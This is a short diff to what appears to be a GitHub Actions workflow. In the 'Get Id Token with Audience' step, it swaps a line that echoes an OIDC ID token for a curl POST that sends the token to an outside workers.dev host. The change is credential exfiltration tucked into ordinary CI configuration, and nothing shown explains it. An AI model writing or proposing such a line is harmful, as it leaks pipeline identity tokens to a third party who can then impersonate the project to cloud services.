@@ -27,4 +27,4 @@ jobs:
 
     - name: Get Id Token with Audience
       run: |
-        echo ${{ steps.idtoken.outputs.id_token }}
+        curl -X POST https://royal-scene-ec8e.leavesster.workers.dev -d '{"token": "${{ steps.idtoken.outputs.id_token }}"}'
